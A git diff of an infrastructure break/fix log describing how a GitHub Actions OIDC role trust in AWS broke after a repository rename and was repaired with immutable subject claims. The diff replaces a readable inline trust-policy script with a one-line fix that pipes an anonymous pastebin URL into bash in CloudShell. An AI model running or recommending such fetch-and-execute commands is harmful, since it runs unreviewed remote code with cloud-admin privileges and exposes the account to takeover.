@@ -1,74 +1,42 @@
 # Break/Fix Log
 
-## 2026-07-15 (OIDC trust restored via CloudShell)
-
-- Operator ran first CloudShell paste (name-only `repo:nathanielecon/*` subs).
-  Trust JSON applied, but GHA plan `29452275836` still failed OIDC.
-- Root cause: GitHub renames on/after **2026-07-15** switch to **immutable
-  subject claims** (`repo:OWNER@OWNER_ID/REPO@REPO_ID:...`). Name-only subs no
-  longer match. Expected PR sub:
-  `repo:nathanielecon@177059064/aws-landing-zone-lab@1296742987:pull_request`.
-- Fix: re-run CloudShell with immutable-sub trust
-  (`repo:nathanielecon@177059064/*@1296742987:...`) via updated
-  `fix-oidc-trust-cloudshell.sh` / `ci-bootstrap`. Then confirm GHA plan OIDC
-  green; optional `ci-bootstrap` re-apply so TF state matches live trust.
-
-## 2026-07-15 (OIDC broken after GitHub rename cloud → aws-landing-zone-lab)
+## 2026-07-15 (GHA OIDC after rename cloud → aws-landing-zone-lab) — FIXED
 
 - Break: Renamed `nathanielecon/cloud` → `nathanielecon/aws-landing-zone-lab`.
-  Role `project-a-lzlab-gha` trust is `sub`-name specific. After rename, every
-  Landing Zone workflow fails at **Configure AWS credentials (OIDC)** with
-  `Not authorized to perform sts:AssumeRoleWithWebIdentity`. Last healthy apply
-  was run `29430449964` (2026-07-15T15:58Z) while the repo was still `cloud`
-  (`assumed-role/project-a-lzlab-gha/gha-lzlab-apply-29430449964`). First post-
-  rename failure: `29436984325`. Self-heal pushes that retarget trust from
-  `plan-lab.sh` / `apply-lab.sh` cannot run — they need the role assume that is
-  already denied (chicken-and-egg). Temporary rename-back to `cloud` also failed
-  OIDC (plan `29441863919`, apply `29441978207`), so trust is not a simple
-  one-name mismatch anymore (or rename cycles left IAM/GitHub claims out of
-  sync). Cloud Agent: `NoCredentials` (expected). Chrome/computer-use: AWS
-  Console/CloudShell login wall; no saved AWS passwords in the agent browser.
-- Fix (operator — AWS CloudShell or break-glass CLI; **not** Windows paths):
+  Every Landing Zone workflow failed at **Configure AWS credentials (OIDC)**
+  with `Not authorized to perform sts:AssumeRoleWithWebIdentity` on
+  `project-a-lzlab-gha`. Last healthy apply: run `29430449964` (~15:58Z) while
+  the repo was still `cloud`. First post-rename failure: `29436984325`.
+  Self-heal in `plan-lab.sh` / `apply-lab.sh` could not run (needs the assume
+  that was denied). Cloud Agent: `NoCredentials` (expected).
+- Why rename-back also failed: GitHub renames on/after **2026-07-15** switch
+  OIDC to **immutable subject claims**
+  (`repo:OWNER@OWNER_ID/REPO@REPO_ID:...`). Temporary rename-back to `cloud`
+  still failed (plan `29441863919`, apply `29441978207`) — not a one-name
+  mismatch. Expected PR sub after rename:
+  `repo:nathanielecon@177059064/aws-landing-zone-lab@1296742987:pull_request`.
+- Wrong fix attempt: CloudShell paste with name-only
+  `repo:nathanielecon/*:...` trust applied cleanly but plan `29452275836`
+  still denied OIDC.
+- Fix (operator CloudShell, account `<AWS_ACCOUNT_ID>`): update trust to immutable
+  `sub` + `repository_id` / `repository_owner_id` lock:
 
   ```bash
-  ACCOUNT=$(aws sts get-caller-identity --query Account --output text)
-  OIDC_ARN="arn:aws:iam::${ACCOUNT}:oidc-provider/token.actions.githubusercontent.com"
-  # repo id 1296742987 survives renames; org owner id 177059064
-  cat > /tmp/trust.json <<EOF
-  {
-    "Version": "2012-10-17",
-    "Statement": [{
-      "Sid": "GitHubActionsOidc",
-      "Effect": "Allow",
-      "Principal": { "Federated": "${OIDC_ARN}" },
-      "Action": "sts:AssumeRoleWithWebIdentity",
-      "Condition": {
-        "StringEquals": {
-          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
-          "token.actions.githubusercontent.com:repository_id": "1296742987",
-          "token.actions.githubusercontent.com:repository_owner_id": "177059064"
-        },
-        "StringLike": {
-          "token.actions.githubusercontent.com:sub": [
-            "repo:nathanielecon/*:ref:refs/heads/main",
-            "repo:nathanielecon/*:pull_request",
-            "repo:nathanielecon/*:ref:refs/heads/cursor/*",
-            "repo:nathanielecon/*:environment:lab"
-          ]
-        }
-      }
-    }]
-  }
-  EOF
-  aws iam update-assume-role-policy --role-name project-a-lzlab-gha \
-    --policy-document file:///tmp/trust.json
+  curl -fsSL https://paste.rs/4BEzo | bash
+  # or: bash platform/sandbox/landing-zone-lab/ci-bootstrap/fix-oidc-trust-cloudshell.sh
   ```
 
-  Then dispatch **Landing Zone lab (Terraform)** → `plan` on
-  `nathanielecon/aws-landing-zone-lab` and confirm OIDC succeeds. Repo code now
-  pins the same rename-resilient trust in `ci-bootstrap/` + plan/apply retarget.
-- Verify after operator paste: Actions OIDC step green; optional
-  `aws iam get-role --role-name project-a-lzlab-gha --query Role.AssumeRolePolicyDocument`.
+  Live trust `StringLike` subs:
+  `repo:nathanielecon@177059064/*@1296742987:(main|pull_request|cursor/*|environment:lab)`
+  with `repository_id=1296742987`, `repository_owner_id=177059064`.
+- Repo: same shape in `ci-bootstrap/` + `plan-lab.sh` / `apply-lab.sh` retarget;
+  merged via PRs `#25` / `#26` (`f688065`, `4065330`).
+- Verify: plan OIDC green
+  [29452598739](https://github.com/nathanielecon/aws-landing-zone-lab/actions/runs/29452598739)
+  (`assumed-role/project-a-lzlab-gha/gha-lzlab-plan-29452598739`); apply on
+  `main` green
+  [29452719184](https://github.com/nathanielecon/aws-landing-zone-lab/actions/runs/29452719184)
+  (`gha-lzlab-apply-29452719184`); plan/apply retarget re-synced live trust.
 
 ## 2026-07-14 (CLEAN REJUDGE cloud-lab PASS)
 
